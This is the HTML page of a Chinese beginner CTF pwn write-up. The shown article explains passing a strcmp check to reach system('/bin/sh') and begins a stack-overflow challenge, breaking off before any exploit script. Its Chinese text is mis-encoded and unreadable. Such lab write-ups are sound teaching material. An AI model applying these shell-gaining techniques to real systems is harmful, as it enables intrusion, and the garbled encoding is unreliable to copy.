<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="PWNç³»åˆ—ï¼ŒäºŒè¿›åˆ¶ç»¼åˆåŸºç¡€ï¼Œ10é“æ€¥é€Ÿå…¥é—¨">
<title>NSSctf-ä¸“é¢˜PWN-writeup</title>

<link rel='canonical' href='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/'>

<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="NSSctf-ä¸“é¢˜PWN-writeup">
<meta property='og:description' content="PWNç³»åˆ—ï¼ŒäºŒè¿›åˆ¶ç»¼åˆåŸºç¡€ï¼Œ10é“æ€¥é€Ÿå…¥é—¨">
<meta property='og:url' content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-07T13:10:05&#43;00:00'/><meta property='og:image' content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png' />
<meta name="twitter:title" content="NSSctf-ä¸“é¢˜PWN-writeup">
<meta name="twitter:description" content="PWNç³»åˆ—ï¼ŒäºŒè¿›åˆ¶ç»¼åˆåŸºç¡€ï¼Œ10é“æ€¥é€Ÿå…¥é—¨"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥ | Friends Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#pwnä»‹ç»">PWNä»‹ç»</a></li>
    <li><a href="#pwntoolsä¸gbdä½¿ç”¨">Pwntoolsä¸GBDä½¿ç”¨</a></li>
    <li><a href="#æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</a></li>
    <li><a href="#ret2textåŠå…¶å˜ç§">ret2textåŠå…¶å˜ç§</a></li>
    <li><a href="#rop">ROP</a></li>
    <li><a href="#ropgadget">ROPgadget</a></li>
    <li><a href="#ret2shellcode">ret2shellcode</a></li>
    <li><a href="#ret2sys">ret2sys</a></li>
    <li><a href="#ret2libc">ret2libc</a></li>
    <li><a href="#ç»¼åˆç»ƒä¹ ">ç»¼åˆç»ƒä¹ </a></li>
    <li><a href="#æ€»ç»“">æ€»ç»“</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/">
                <img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF_hu_1ec2ea7a5fb798a9.png"
                        srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF_hu_1ec2ea7a5fb798a9.png 800w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/NSSCTF_hu_66f9d5375d47268.png 1600w"
                        width="800" 
                        height="405" 
                        loading="lazy"
                        alt="Featured image of post NSSctf-ä¸“é¢˜PWN-writeup" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf_writeup/" style="background-color: #2a9d8f; color: #fff;">
                CTF_writeup
            </a>
        
            <a href="/categories/ctfpwn/" style="background-color: #2a9d8f; color: #fff;">
                CTFpwn
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/">NSSctf-ä¸“é¢˜PWN-writeup</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            PWNç³»åˆ—ï¼ŒäºŒè¿›åˆ¶ç»¼åˆåŸºç¡€ï¼Œ10é“æ€¥é€Ÿå…¥é—¨
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-10-01</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>[TOC]</p>
<p>å‰è¨€ï¼š</p>
<p>å‡ºé¢˜ä½œè€…æ˜¯kagehutatsuï¼Œæˆ‘èŠ±äº†3680é‡‘å¸è´­ä¹°çš„ï¼Œè™½è¯´è¿˜æ˜¯PWNå…¥é—¨ï¼Œä½†æˆ‘æ„Ÿè§‰åšç‚¹æµ“ç¼©çš„åç»¼åˆçš„å…¥é—¨PWNé¢˜æ›´å¥½äº›ï¼ŒCTFshowå…¥é—¨PWNé¢˜è¯´å®è¯ç¡®å®é€‚åˆå½“æ—¶0åŸºç¡€å…¥é—¨ï¼ğŸ˜„</p>
<p>æœ¬æ¬¡å…¥é—¨PWNå­¦ä¹ ç›¸å½“äºæˆ‘çš„ç¬¬äºŒæ¬¡â€œå…¥é—¨â€ï¼Œä»¥ä¸¤å¤–ä¸€ç§è§’åº¦å¸¦å…¥é—¨è€…æ›´è¿›ä¸€æ­¥ç†è§£PWNåŸºç¡€çŸ¥è¯†ï¼Œåœ¨<a class="link" href="https://expl0rer.top/p/ctfshow-%e5%85%a5%e9%97%a8pwn-writeup/"  target="_blank" rel="noopener"
    >CTFshow-å…¥é—¨PWNä¸“é¢˜</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>ã€<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
    >PWN-3</a>ä¸­å‡ºç°çš„å‰ç½®çŸ¥è¯†ç‚¹ï¼Œåœ¨è¿™é‡Œæœ‰æ¶‰åŠåˆ°çš„æˆ‘éƒ½ä¼šæœ‰æ‰€å¼•ç”¨å‡ºæ¥ã€‚</p>
<h2 id="pwnä»‹ç»">PWNä»‹ç»
</h2><p>é¢˜ç›®ï¼šxxxï¼›å°±æ˜¯æ²¡æœ‰é¢˜ç›®ï¼Œå•¥ä¹Ÿæ²¡</p>
<p>ä¸Šç¨‹åºncè¿æ¥çœ‹çœ‹ï¼Œåˆ«è¯´ä½ ä¸ä¼šnc&hellip;&hellip; <a class="link" href="PWN-1" >PWN-1</a></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1.png"
	width="1014"
	height="164"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1_hu_3f179d279be1e9f2.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/1_hu_c3682a4e186ad5e7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="618"
		data-flex-basis="1483px"
	
></p>
<p>å“ï¼Œè¾“å…¥å•¥éƒ½æ²¡æœ‰&hellip;</p>
<p>ç”¨IDAåˆ†æä¸€ä¸‹ï¼Œè·Ÿè¿›mainå‡½æ•°ï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2.png"
	width="1120"
	height="410"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2_hu_f1d3bf6e9b9401c9.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/2_hu_f4ba01d05040f7f7.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="655px"
	
></p>
<p>å¥½å®¶ä¼™ï¼Œçœ‹åˆ°<code>system(&quot;/bin/sh&quot;);</code>æœ‰ifåˆ¤æ–­è¯­å¥ï¼Œæ„æ€å°±æ˜¯è¯´è®©æˆ‘è¾“å…¥ä¸€ä¸ªæ•°ï¼ˆå‰é¢æœ‰ä¸ªreadå‡½æ•°é™åˆ¶å¤§å°ï¼Œä¸è¿‡é‚£ç©æ„å®¹é‡è¿™ä¹ˆå¤§ï¼Œæˆ‘å†è ¢ä¹Ÿä¸ä¼šè¯´è¾“å…¥ä¸¤ç™¾å¤šä½å­—ç¬¦ç»™ç¨‹åºå§ğŸ˜„ï¼‰ï¼Œè¿™ä¸ªæ•°ä¼šè¢«readå‡½æ•°è¯»å–ç»™bufå‚æ•°ï¼Œæ¥ç€åˆ°strcmpå‡½æ•°ï¼ˆæ¯”è¾ƒä½œç”¨ï¼Œåˆ¤æ–­æ˜¯å¦â€œä¸ç›¸ç­‰â€ï¼‰â€”â€”<code>if ( !strcmp(buf, &quot;love\n&quot;) )</code>æ„æ€æ˜¯bufå’Œâ€œloveâ€å­—ç¬¦ä¸²ç›¸æ¯”çš„è¯æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœæ˜¯çœŸçš„å°±è·³åˆ°ä¸‹ä¸€æ­¥ï¼Œæ˜¾ç„¶ifä¸‹æ–¹æ˜¯systemå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¾€ç¨‹åºè¾“å…¥loveå°±å¥½å•¦ã€‚</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3.png"
	width="950"
	height="465"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3_hu_49b9360381715028.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/3_hu_6b1317d937dfc4ec.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<p>çœ‹åˆ°ä¸‹ä¸€æ­¥æ˜¯è¢«PWNé€šäº†çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œäº¤äº’æ¨¡å¼äº†ï¼Œç”¨lsã€catå‘½ä»¤æ‹¿åˆ°flagå§ã€‚</p>
<h2 id="pwntoolsä¸gbdä½¿ç”¨">Pwntoolsä¸GBDä½¿ç”¨
</h2><p>è¿˜æ˜¯æ²¡é¢˜ç›®&hellip; <a class="link" href="PWN-2" >PWN-2</a></p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5.png"
	width="781"
	height="204"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5_hu_974624441b7ab9d3.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/5_hu_5ff6e436f49730db.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="382"
		data-flex-basis="918px"
	
></p>
<p>æœäº†æ€ä¹ˆå¼€äº†canaryå•Šï¼Œä¸æ˜¯è¦æ ˆæº¢å‡ºå—ï¼Ÿ</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4.png"
	width="684"
	height="345"
	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4_hu_b41b8e7161c72aea.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/4_hu_f97d5da594397fef.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="475px"
	
></p>
<p>è¿™é¢˜å’Œä¸Šé¢˜ä¸åŒçš„æ˜¯ï¼Œè¿™å›v5è¦ç­‰äºâ€œ520â€æ‰èƒ½æ‰§è¡Œsystemå‡½æ•°ï¼Œä½†v5å†æ­¤å‰æ˜¯è¢«èµ‹å€¼ä½â€œ1314â€çš„ï¼Œå•é æˆ‘ä»¬è¾“å…¥å­—ç¬¦ç»™ç¨‹åºä¸èƒ½æ‹¿åˆ°flagï¼Œç”¨å…¶å®ƒæ‰‹æ®µå»ä¿®æ”¹v5ã€‚</p>
<p>è¿™ä¸æ˜æ‘†è¦æ ˆæº¢å‡ºè¦†ç›–v5ï¼Ÿ</p>
<p>åˆ«æ€¥æˆ‘ä»¬æ¥gdbè°ƒè¯•ä¸€ä¸‹ï¼ˆgdbè°ƒè¯•çš„ç¡®å¾ˆéš¾ï¼Œæ¶‰åŠç®€åŒ–æŒ‡ä»¤æ“ä½œã€æ±‡ç¼–å®¡è®¡ç­‰ï¼Œå¯ä»¥å…ˆçœ‹æˆ‘å†™çš„æ–‡ç« å†æ¥ç”¨gdbï¼‰</p>
<p>å¼€gdbï¼Œæ–­ç‚¹ï¼š</p>
<div class="highlight"><div class="chroma">
